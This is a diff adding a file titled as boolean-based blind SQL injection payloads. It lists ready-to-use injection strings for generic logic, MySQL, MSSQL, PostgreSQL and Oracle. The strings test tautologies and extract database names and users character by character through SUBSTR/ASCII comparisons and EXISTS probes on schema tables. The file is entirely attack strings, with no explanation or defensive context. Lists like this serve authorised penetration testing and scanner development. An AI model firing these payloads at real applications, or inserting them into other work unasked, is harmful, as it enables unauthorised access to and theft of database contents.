@@ -1,0 +1,32 @@
+# Modern Boolean-Based Blind SQLi Payloads
+
+# Generic Logic
+' OR 1=1-- -
+' AND 1=1-- -
+' AND 1=2-- -
+' OR 'a'='a'
+' OR 'a'='b'
+
+# MySQL
+' AND (SELECT 1)=1-- -
+' AND (SELECT SUBSTR(user(),1,1))='a'-- -
+' AND ASCII(SUBSTR((SELECT database()),1,1))>64-- -
+' AND EXISTS(SELECT * FROM information_schema.tables)-- -
+
+# MSSQL
+' AND 1=(SELECT 1)--
+' AND SUBSTRING(DB_NAME(),1,1)='a'--
+' AND ASCII(SUBSTRING(DB_NAME(),1,1))>64--
+' AND EXISTS(SELECT * FROM sysobjects)--
+
+# PostgreSQL
+' AND (SELECT 1)=1--
+' AND SUBSTR(current_database(),1,1)='a'--
+' AND ASCII(SUBSTR(current_database(),1,1))>64--
+' AND EXISTS(SELECT 1 FROM information_schema.tables)--
+
+# Oracle
+' AND 1=(SELECT 1 FROM DUAL)--
+' AND SUBSTR((SELECT user FROM DUAL),1,1)='A'--
+' AND ASCII(SUBSTR((SELECT user FROM DUAL),1,1))>64--
+' AND EXISTS(SELECT 1 FROM all_tables)--
